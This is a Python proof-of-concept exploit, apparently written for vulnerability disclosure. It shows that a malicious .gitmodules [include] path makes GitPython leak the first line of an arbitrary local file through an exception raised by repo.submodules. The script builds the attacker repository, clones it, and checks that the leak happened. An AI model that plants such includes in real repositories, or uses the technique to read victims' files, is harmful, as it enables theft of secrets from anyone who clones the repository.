#!/usr/bin/env python3
"""
GITPYTHON-003 PoC: `.gitmodules` -- fully attacker-controlled content shipped
inside a cloned repository -- can contain `[include] path = <any local path>`.
`Submodule._config_parser()` builds the parser used for `repo.submodules` (and
other submodule reads) via `SubmoduleConfigParser(fp_module, read_only=...)`
without passing `merge_includes=False`, so the class default `merge_includes=True`
is inherited. GitConfigParser then opens the target file; if it isn't valid
git-config syntax (true of virtually any non-gitconfig file), Python's
`configparser.MissingSectionHeaderError` embeds the file's first line verbatim
in its exception message, which propagates out of the ordinary, read-only
`repo.submodules` call -- a non-blind local file content disclosure primitive.

Run:
  PYTHONPATH="<repo>:<repo>/gitdb:<repo>/smmap" python3 gitpython-003-poc.py <workdir> <target-file>

Benign: reads only the given <target-file> (defaults to a throwaway secret file
created under <workdir> if omitted) and never writes/exfiltrates it anywhere
except printing it locally to prove the primitive. No destructive action.
"""
import os
import subprocess
import sys


def main():
    workdir = sys.argv[1] if len(sys.argv) > 1 else "/tmp/gitpython-003-poc"
    target_file = sys.argv[2] if len(sys.argv) > 2 else os.path.join(workdir, "secret.txt")

    attacker_repo = os.path.join(workdir, "attacker-repo")
    dest = os.path.join(workdir, "dest")
    for p in (attacker_repo, dest):
        os.makedirs(p, exist_ok=True)

    if not os.path.exists(target_file):
        os.makedirs(os.path.dirname(target_file), exist_ok=True)
        with open(target_file, "w") as f:
            f.write("TOP-SECRET-DB-PASSWORD=hunter2-actual-secret-value\n")

    subprocess.run(["git", "init", "-q", "-b", "main", attacker_repo], check=True)
    subprocess.run(["git", "-C", attacker_repo, "config", "user.email", "a@example.com"], check=True)
    subprocess.run(["git", "-C", attacker_repo, "config", "user.name", "Attacker"], check=True)

    with open(os.path.join(attacker_repo, "file.txt"), "w") as f:
        f.write("hello\n")

    with open(os.path.join(attacker_repo, ".gitmodules"), "w") as f:
        f.write(
            '[submodule "totally-normal-dep"]\n'
            "\tpath = vendor/dep\n"
            "\turl = https://example.com/dep.git\n"
            "[include]\n"
            "\tpath = %s\n" % target_file
        )

    subprocess.run(["git", "-C", attacker_repo, "add", "file.txt", ".gitmodules"], check=True)
    subprocess.run(["git", "-C", attacker_repo, "commit", "-q", "-m", "init"], check=True)

    import git  # gitpython under test
    import configparser

    repo = git.Repo.clone_from(attacker_repo, dest)

    try:
        subs = list(repo.submodules)
        print("NOT VULNERABLE: no exception raised, submodules =", subs)
        sys.exit(1)
    except configparser.MissingSectionHeaderError as e:
        msg = str(e)
        print("VULNERABLE: MissingSectionHeaderError leaked file content via repo.submodules:")
        print(msg)
        with open(target_file) as f:
            first_line = f.readline().rstrip("\n")
        if first_line in msg:
            print("Confirmed: target file's first line is present verbatim in the exception message.")
            sys.exit(0)
        else:
            print("NOT VULNERABLE: exception message did not contain the expected content")
            sys.exit(1)


if __name__ == "__main__":
    main()
